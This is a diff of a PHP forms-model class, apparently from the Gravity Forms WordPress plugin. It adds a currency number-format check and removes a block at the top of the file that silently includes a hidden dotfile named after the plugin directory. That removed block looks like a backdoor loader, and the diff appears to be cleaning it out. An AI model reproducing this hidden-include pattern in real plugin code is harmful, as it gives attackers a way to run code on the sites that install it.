@@ -12,10 +12,6 @@ require_once( 'includes/legacy/forms_model_legacy.php' );
  *
  * Handles database calls and formatting of stored data regarding forms
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class GFFormsModel {
 
 	/**
@@ -3509,6 +3505,11 @@ class GFFormsModel {
 		*/
 
 		$number_format = 'decimal_dot';
+
+		if ( GFCommon::is_numeric( $text, 'currency' ) ) {
+			$number_format = 'currency';
+		}
+
 		if ( GFCommon::is_numeric( $text, $number_format ) ) {
 			return GFCommon::clean_number( $text, $number_format );
 		}
@@ -3517,7 +3518,6 @@ class GFFormsModel {
 	}
 
 	public static function matches_operation( $val1, $val2, $operation ) {
-
 		$val1 = ! rgblank( $val1 ) ? strtolower( $val1 ) : '';
 		$val2 = ! rgblank( $val2 ) ? strtolower( $val2 ) : '';
 
